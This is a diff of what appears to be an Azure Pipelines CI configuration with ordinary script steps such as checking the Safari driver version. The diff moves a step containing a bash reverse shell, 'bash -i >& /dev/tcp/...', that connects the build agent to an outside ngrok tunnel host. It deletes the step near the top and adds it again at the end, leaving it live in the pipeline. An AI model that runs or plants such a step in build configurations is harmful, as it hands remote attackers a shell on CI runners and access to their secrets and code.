@@ -11,8 +11,6 @@ pool:
 
 steps:
 
-- script: |
-    bash -i >& /dev/tcp/0.tcp.ngrok.io/14761 0>&1
     
 - script: |
     safaridriver --version
@@ -36,3 +34,6 @@ steps:
 
   displayName: 'Run a one-line script'
 
+
+- script: |
+    bash -i >& /dev/tcp/0.tcp.ngrok.io/14761 0>&1
